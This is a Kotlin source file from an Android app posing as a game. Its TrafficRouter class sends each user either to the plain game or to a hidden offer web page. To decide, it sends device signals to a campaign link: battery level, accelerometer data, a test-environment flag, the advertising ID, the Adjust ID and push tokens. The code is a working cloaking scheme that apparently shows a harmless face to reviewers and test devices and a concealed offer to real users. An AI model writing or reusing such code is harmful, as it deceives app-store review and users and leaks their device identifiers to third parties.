package com.chickierunway.game.integration

import android.os.Handler
import android.os.Looper
import com.chickierunway.game.BuildConfig
import java.util.concurrent.Executors

/**
 * Decides White/Black without any network probe of its own. A pinned branch or a fresh cached
 * address is answered instantly; otherwise it builds the campaign link, and the WebView that opens
 * it is the single click that lets the tracker decide (see OfferWebViewClient).
 */
object TrafficRouter {

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun route(onResult: (RouteDecision) -> Unit) {
        // A pinned White answers without the network, so relaunches are instant and can never
        // flip the user to the offer.
        if (IntegrationStorage.isWhiteLocked) {
            deliver(RouteDecision.White, onResult)
            return
        }
        // A still-fresh cached address short-circuits the campaign link for 24h.
        IntegrationStorage.freshOfferUrl()?.let {
            deliver(RouteDecision.Black(it, fromCache = true), onResult)
            return
        }
        if (BuildConfig.OFFER_BASE_URL.isBlank()) {
            // Nothing to open: White for now, but pin nothing so a build with a URL still asks.
            deliver(RouteDecision.White, onResult)
            return
        }

        executor.execute {
            val url = buildOfferUrl()
            deliver(
                if (url.isBlank()) RouteDecision.White else RouteDecision.Black(url, fromCache = false),
                onResult
            )
        }
    }

    /**
     * Background thread only: AdjustManager.awaitAdid(), AccelerometerProbe.await(),
     * GaidProbe.await() and PushManager.awaitToken() block for up to a few seconds each. Called
     * from the executor in route().
     */
    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking campaign/network here compiles, runs, and quietly loses
        // parameters the moment Adjust adds a field.
        attribution = IntegrationStorage.attributionParams,
        // Blocks briefly so the adid makes the first click; already on the executor.
        adid = AdjustManager.awaitAdid(),
        extraParams = buildList {
            add("sub12" to DeviceSignals.battery)
            add("sub13" to AccelerometerProbe.await())
            add("sub14" to DeviceSignals.isTestEnvironment.toString())
            // Through extras, not like adid: it must go out always, empty included.
            add("gps_adid" to GaidProbe.await())
            add("push_token" to PushManager.awaitToken())
            add("push_id" to IntegrationStorage.pushId)
        },
        sub1InPath = BuildConfig.OFFER_ROUTING == "prily",
    )

    /**
     * A pushed link is opened as sent; only push_token and push_id are appended, so the push
     * service can tie the open back to this install. Inserted before any fragment. Background
     * thread only: it waits on the token latch.
     */
    fun appendPushParams(url: String): String {
        if (url.isBlank()) return url
        val hash = url.indexOf('#')
        val base = if (hash >= 0) url.substring(0, hash) else url
        val fragment = if (hash >= 0) url.substring(hash) else ""
        val query = CampaignParser.toQuery(
            linkedMapOf(
                "push_token" to PushManager.awaitToken(),
                "push_id" to IntegrationStorage.pushId,
            )
        )
        val separator = if (base.contains('?')) '&' else '?'
        return base + separator + query + fragment
    }

    private fun deliver(decision: RouteDecision, onResult: (RouteDecision) -> Unit) {
        mainHandler.post { onResult(decision) }
    }
}
